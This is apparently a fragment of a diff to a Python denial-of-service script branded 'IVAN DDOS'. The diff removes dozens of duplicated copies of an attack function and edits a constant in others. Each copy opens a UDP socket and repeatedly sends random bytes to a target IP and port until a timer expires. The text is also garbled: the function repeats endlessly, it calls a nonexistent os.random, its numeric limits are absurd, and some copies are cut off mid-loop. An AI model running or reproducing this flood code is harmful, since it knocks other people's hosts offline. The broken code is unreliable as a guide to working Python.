-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -16259,225 +13845,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -16853,7 +14221,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -16885,7 +14253,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -16917,7 +14285,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -16949,7 +14317,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -16981,7 +14349,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -17007,7 +14375,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -17039,39 +14407,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -17103,7 +14439,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -17135,415 +14471,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -17575,225 +14503,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
